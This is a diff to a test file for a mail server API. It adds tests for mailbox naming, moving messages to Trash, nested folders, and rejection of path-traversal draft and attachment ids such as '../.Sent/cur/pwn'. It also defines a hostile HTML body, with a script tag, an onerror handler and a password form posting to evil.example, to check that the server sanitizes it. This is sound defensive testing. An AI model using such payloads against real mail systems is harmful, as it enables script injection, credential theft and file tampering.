@@ -1,9 +1,13 @@
 import { beforeAll, describe, expect, spyOn, test } from 'bun:test';
-import type { EmailSummary, MaildirMailbox } from '@workspace/lib/types/mail';
+import { existsSync, readdirSync } from 'node:fs';
+import { join } from 'node:path';
+import { MAILBOX_SENT } from '@workspace/lib/constants/mailboxes';
+import type { Email, EmailDraft, EmailSummary, MaildirMailbox } from '@workspace/lib/types/mail';
 import { MaildirStore } from '../../lib/mail/maildir-store';
 // Static import of '../lib/core/mailer' would trigger server-config module evaluation
 // before './setup' sets EIGEN_DATA_ROOT. Dynamic-import it inside the test instead.
-import { assertJson, authedRequest, findOrFail, getTestContext } from '../setup';
+import { maildirOf, mailRootOf } from '../mail-test-helpers';
+import { app, assertJson, authedRequest, findOrFail, getTestContext } from '../setup';
 
 const isWindows = process.platform === 'win32';
 
@@ -39,6 +43,14 @@ describe.skipIf(isWindows)('Mail', () => {
         const data = await assertJson<MaildirMailbox | false>(res);
         expect(data).not.toBe(false);
         expect((data as MaildirMailbox).path).toBe('Projects');
+
+        // A standard name answers in any case, under its canonical spelling.
+        const sent = await assertJson<MaildirMailbox | false>(
+            await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/mailbox-exists/sent`),
+        );
+        expect(sent).not.toBe(false);
+        expect((sent as MaildirMailbox).path).toBe(MAILBOX_SENT);
+        expect((sent as MaildirMailbox).flags).toContain('\\Sent');
     });
 
     test('mailbox-exists returns false for unknown mailbox', async () => {
@@ -55,7 +67,7 @@ describe.skipIf(isWindows)('Mail', () => {
         const res = await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/mailbox`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ mailbox: 'Bad!Name' }),
+            body: JSON.stringify({ mailbox: 'Bad..Name' }),
         });
         expect(res.status).toBe(400);
         expect(await res.text()).toContain('Invalid mailbox');
@@ -322,6 +334,33 @@ describe.skipIf(isWindows)('Mail', () => {
             const targetMessages = await assertJson<EmailSummary[]>(targetRes);
             expect(targetMessages.some((m) => m.id === messageId)).toBe(true);
         });
+
+        test('move-to-trash files the message in Trash', async () => {
+            const res = await authedRequest(
+                ctx.alice.user.sessionToken,
+                `/mail/${ctx.alice.user.id}/message/move-to-trash`,
+                {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ messageId }),
+                },
+            );
+            expect(res.status).toBe(200);
+
+            const trashRes = await authedRequest(
+                ctx.alice.user.sessionToken,
+                `/mail/${ctx.alice.user.id}/mailbox/Trash`,
+            );
+            const trashMessages = await assertJson<EmailSummary[]>(trashRes);
+            expect(trashMessages.some((m) => m.id === messageId)).toBe(true);
+
+            const targetRes = await authedRequest(
+                ctx.alice.user.sessionToken,
+                `/mail/${ctx.alice.user.id}/mailbox/${targetMailbox}`,
+            );
+            const targetMessages = await assertJson<EmailSummary[]>(targetRes);
+            expect(targetMessages.some((m) => m.id === messageId)).toBe(false);
+        });
     });
 
     describe('Error Handling', () => {
@@ -404,6 +443,34 @@ describe.skipIf(isWindows)('Mail', () => {
             expect(res.status).not.toBe(200);
         });
 
+        test('create mailbox with an empty path segment is rejected', async () => {
+            const res = await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/mailbox`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mailbox: 'Projects//2026' }),
+            });
+            expect(res.status).toBe(400);
+        });
+
+        test('a nested mailbox is one Maildir++ folder, addressed by either delimiter', async () => {
+            const createRes = await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/mailbox`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mailbox: 'Clients/Acme/2026' }),
+            });
+            expect(createRes.status).toBe(200);
+
+            // `.Clients.Acme.2026` on disk, so the dotted path a Maildir++ listing reports resolves to it.
+            expect(existsSync(join(maildirOf(ctx.alice.user.id), '.Clients.Acme.2026'))).toBe(true);
+            const existsRes = await authedRequest(
+                ctx.alice.user.sessionToken,
+                `/mail/${ctx.alice.user.id}/mailbox-exists/Clients.Acme.2026`,
+            );
+            const data = await assertJson<MaildirMailbox | false>(existsRes);
+            expect(data).not.toBe(false);
+            expect((data as MaildirMailbox).path).toBe('Clients.Acme.2026');
+        });
+
         test('valid mailbox still works after rejected traversal attempts', async () => {
             const res = await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/mailbox`, {
                 method: 'POST',
@@ -419,6 +486,43 @@ describe.skipIf(isWindows)('Mail', () => {
             const data = await assertJson<MaildirMailbox | false>(existsRes);
             expect(data).not.toBe(false);
             expect((data as MaildirMailbox).path).toBe('ValidAfterTraversal');
+        });
+    });
+
+    describe('Regression: client-chosen draft and attachment ids', () => {
+        const putDraftRaw = (body: unknown) =>
+            authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/message/draft`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+            });
+
+        test('a draft id that escapes the Drafts mailbox is rejected and writes nothing', async () => {
+            for (const id of ['../.Sent/cur/pwn', '../../.Sent/cur/pwn']) {
+                const res = await putDraftRaw({ mail: { id, subject: 'Traversal', text: 'body' } });
+                expect(res.status).toBe(400);
+            }
+
+            const entries = readdirSync(mailRootOf(ctx.alice.user.id), { recursive: true });
+            expect(entries.filter((e) => String(e).includes('pwn'))).toEqual([]);
+        });
+
+        test('the id the server mints is accepted back on the next save', async () => {
+            const created = await assertJson<EmailSummary>(
+                await putDraftRaw({ mail: { subject: 'Round trip', text: 'body' } }),
+            );
+            const updated = await assertJson<EmailSummary>(
+                await putDraftRaw({ mail: { id: created.id, subject: 'Round trip 2', text: 'body' } }),
+            );
+            expect(updated.id).toBe(created.id);
+        });
+
+        test('a staged-attachment temp id with a separator is rejected', async () => {
+            const res = await putDraftRaw({
+                mail: { subject: 'Temp traversal', text: 'body' },
+                tempAttachmentIds: ['../../.Sent/cur/pwn'],
+            });
+            expect(res.status).toBe(400);
         });
     });
 
@@ -567,6 +671,94 @@ describe.skipIf(isWindows)('Mail', () => {
             );
             expect(res.status).toBe(200);
             expect(await res.text()).toBe('attachment-bytes');
+        });
+    });
+
+    // The reader is the one surface that gets a body, so it is the one place the sanitizer runs.
+    describe('The html a message route serves', () => {
+        const HOSTILE =
+            '<p>Hi</p><script>alert(1)</script><img src=x onerror="alert(2)">' +
+            '<form action="https://evil.example/collect" method="post"><input name="password"></form>' +
+            '<a href="https://ok.example" target="_blank">ok</a>';
+
+        const messageHtml = async (messageId: string): Promise<string> => {
+            const res = await authedRequest(
+                ctx.alice.user.sessionToken,
+                `/mail/${ctx.alice.user.id}/message/${messageId}`,
+            );
+            return (await assertJson<Email>(res)).html ?? '';
+        };
+
+        test('a delivered message is sanitized on the way out', async () => {
+            const raw = [
+                'From: attacker@example.com',
+                `To: ${ctx.alice.user.email}`,
+                'Subject: Hostile body',
+                `Date: ${new Date().toUTCString()}`,
+                'MIME-Version: 1.0',
+                'Content-Type: text/html; charset=utf-8',
+                '',
+                HOSTILE,
+            ].join('\r\n');
+            const delivered = await app.handle(
+                new Request(`http://localhost/mail/deliver/${ctx.alice.user.email}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'message/rfc822' },
+                    body: new TextEncoder().encode(raw).buffer as ArrayBuffer,
+                }),
+            );
+            expect(delivered.status).toBe(200);
+
+            const inbox = await assertJson<EmailSummary[]>(
+                await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/mailbox/inbox`),
+            );
+            const message = findOrFail(inbox, (row) => row.subject === 'Hostile body');
+
+            const html = await messageHtml(message.id);
+            expect(html).toContain('<p>Hi</p>');
+            expect(html).toContain('target="_blank"');
+            expect(html).not.toContain('<script');
+            expect(html).not.toContain('onerror');
+            expect(html).not.toContain('<form');
+            expect(html).not.toContain('evil.example');
+        });
+
+        // A draft's body is the composer's own, and the sidecar hands it back verbatim so the compose view
+        // shows what the user typed. Once the message is no longer a draft it reads through the reader.
+        test('a draft round-trip keeps the composer body, and the sent copy is sanitized', async () => {
+            const saved = await assertJson<EmailDraft>(
+                await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/message/draft`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ mail: { subject: 'Hostile draft', text: 'Hi', html: HOSTILE } }),
+                }),
+            );
+            expect(saved.html).toBe(HOSTILE);
+            expect(await messageHtml(saved.id)).toBe(HOSTILE);
+
+            const sent = await authedRequest(ctx.alice.user.sessionToken, `/mail/${ctx.alice.user.id}/message/send`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    mail: {
+                        id: saved.id,
+                        subject: 'Hostile draft',
+                        text: 'Hi',
+                        html: HOSTILE,
+                        to: {
+                            value: [{ address: ctx.alice.user.email, name: 'Alice' }],
+                            text: ctx.alice.user.email,
+                        },
+                    },
+                }),
+            });
+            expect(sent.status).toBe(200);
+
+            const html = await messageHtml(saved.id);
+            expect(html).toContain('<p>Hi</p>');
+            expect(html).not.toContain('<script');
+            expect(html).not.toContain('onerror');
+            expect(html).not.toContain('<form');
         });
     });
 });
